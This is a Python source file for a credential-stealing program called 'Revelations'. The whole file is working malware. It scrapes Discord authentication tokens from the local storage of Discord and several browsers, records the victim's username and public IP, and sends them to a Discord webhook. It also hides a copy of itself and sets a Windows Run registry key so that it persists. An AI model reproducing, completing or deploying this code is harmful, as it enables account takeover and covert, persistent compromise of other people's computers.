# [ Revelations ] [ rev ] ; Authored by zor
#
#



import requests, os, re, sys, shutil, string, winreg
from dhooks import Webhook, Embed


hook = Webhook("")


def RevelationsExtract(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def RevelationInfiltrate():
    
    ghostrp = (os.path.join('rev.py')) 
    ghostlgm = r'C:\ProgramData\rev.py'
    shutil.move(ghostrp,ghostlgm)

    hide = os.popen('attrib +h ' + ghostlgm)
    hideit = hide.read()
    hide.close()

    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Winx86ProcessTypeTreeRev', 0, REG_SZ,
               new_file_path)


def RevelationProcess():

    user = os.getenv("UserName")
    hostname = requests.get("https://api.ipify.org").text
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Google Chromium': local + '\\Chromium\\User Data\\Default',
        'Google Chrome Canary': local + '\\Google\\Chrome SxS\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',

    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = RevelationsExtract(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'

        embed = Embed(title=f' [ Rev Scraped -> | {user} | {hostname} ] ',color=16764108)
        embed.add_field("Goods =>",message)
        hook.send(embed=embed)



if __name__ == '__main__':
	RevelationProcess()
    RevelationInfiltrate()
